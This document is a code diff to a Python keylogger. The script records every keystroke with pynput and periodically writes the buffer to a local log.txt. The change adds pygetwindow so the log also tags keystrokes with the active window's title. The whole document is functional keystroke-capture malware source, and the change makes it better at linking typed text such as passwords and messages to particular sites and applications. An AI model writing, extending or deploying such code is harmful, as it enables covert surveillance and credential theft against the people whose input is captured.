@@ -1,6 +1,7 @@
 import threading
 import os
 from pynput import keyboard
+import pygetwindow as gw
 
 # --- Global Variables ---
 log = ""  # Stores the keystrokes
@@ -8,24 +9,30 @@ path = os.path.join(os.getcwd(), "log.txt")
 _report_timer = None  # This will hold our timer object
 
 # --- Functions ---
+active_window_title = ""
 
 def processkeys(key):
-    """Appends pressed keys to the global 'log' variable."""
-    global log
+    global log, active_window_title
+
     try:
-        # For normal characters (letters, numbers, etc.)
+        current_window = gw.getActiveWindow()
+        if current_window and current_window.title != active_window_title:
+            active_window_title = current_window.title
+            log += f"\n--- [Window: {active_window_title}] ---\n"
+    except Exception:
+        # Can fail if no window is active, just ignore
+        pass
+
+    # Your existing key processing logic
+    try:
         log += key.char
     except AttributeError:
-        # For special keys (space, enter, etc.)
         if key == keyboard.Key.space:
             log += " "
         elif key == keyboard.Key.enter:
             log += "\n"
         elif key == keyboard.Key.backspace:
             log += "[BACKSPACE]"
-        # You can add more special keys here if you want
-        # else:
-        #     log += f"[{key}]" # Example: log other keys like [SHIFT]
 
 def report(reschedule=True):
     """Saves the current log to the file and reschedules itself."""
@@ -35,7 +42,7 @@ def report(reschedule=True):
     if log:
         with open(path, "a") as logfile:
             logfile.write(log)
-        print(f"--- Log saved ---") # Optional: for debugging
+        print(f"--- Log saved ---") # For debugging
         log = ""  # Clear the log buffer after writing
     
     if reschedule:
